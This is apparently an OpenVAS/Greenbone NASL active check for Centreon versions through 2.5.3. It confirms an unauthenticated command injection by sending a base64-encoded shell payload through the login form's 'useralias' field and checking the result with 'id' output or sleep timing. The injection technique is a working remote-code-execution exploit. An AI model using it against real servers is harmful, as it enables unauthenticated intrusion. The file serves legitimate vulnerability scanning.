# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:centreon:centreon";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105125");
  script_version("2025-01-31T15:39:24+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-01-31 15:39:24 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2014-11-29 11:50:21 +0100 (Sat, 29 Nov 2014)");
  script_name("Centreon <= 2.5.3 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_centreon_web_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("centreon_web/http/detected");

  script_xref(name:"URL", value:"https://seclists.org/oss-sec/2014/q4/848");

  script_tag(name:"summary", value:"Centreon is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP GET and HTTP POST requests and
  checks the responses.");

  script_tag(name:"insight", value:"The following flaws exist:

  1. Unauthenticated remote command execution

  This vulnerability allows an unauthenticated user to execute arbitrary commands on the remote
  system.

  2. Information disclosure (local)

  A specific command-line utility allows local users to escalate privileges and retrieve sensitive
  files on the system, such as /etc/shadow. This vulnerability provides a root user access on files
  (read only)");

  script_tag(name:"impact", value:"Successfully exploiting this issue will allow attackers to
  execute arbitrary code within the context of the affected application.");

  script_tag(name:"affected", value:"Centreon versions through 2.5.3.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

function _exploit( ex, host, useragent, port, baseurl ) {

  local_var ex, host, useragent, port, baseurl;
  local_var login_data, len, req;

  ex = base64( str:ex );

  login_data = "useralias=%24%28echo+" + ex + "%7Cbase64+-d%7Csh%29%5C&password=&submit=Connect+%3E%3E";
  len = strlen( login_data );

  req = 'POST ' + baseurl + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Language: de,en-US;q=0.7,en;q=0.3\r\n' +
        'Accept-Encoding: identity\r\n' +
        'Referer: http://' + host + '/centreon/index.php\r\n' +
        'Connection: keep-alive\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' +
        login_data;
  http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  return; # nb: No need to return anything...
}

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

baseurl = dir + "/index.php";

useragent = http_get_user_agent();
host = http_host_name( port:port );

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + '.txt';
ex = 'id > ./' + file;

_exploit( ex:ex, host:host, useragent:useragent, port:port, baseurl:baseurl );

url = dir + "/" + file;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ 'uid=[0-9]+.*gid=[0-9]+' ) {
  ex = 'rm ' + file;
  _exploit( ex:ex, host:host, useragent:useragent, port:port, baseurl:baseurl );
  VULN = TRUE;
}

if( ! VULN ) {
  ex = "sleep 1";
  start = unixtime();
  _exploit( ex:ex, host:host, useragent:useragent, port:port, baseurl:baseurl );
  stop = unixtime();

  if( stop - start > 7 )
    exit( 0 );

  lat = ( stop - start );

  time = make_list( 3, 5, 7 );

  foreach i( time ) {
    ex = "sleep " + i;
    start = unixtime();
    _exploit( ex:ex, host:host, useragent:useragent, port:port, baseurl:baseurl );
    stop = unixtime();

    if ( stop - start < i || stop - start > ( i + 2 + lat ) ) {
      exit( 0 );
    }
  }
  VULN = TRUE;
}

if( VULN ) {
  report = http_report_vuln_url( port:port, url:baseurl );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
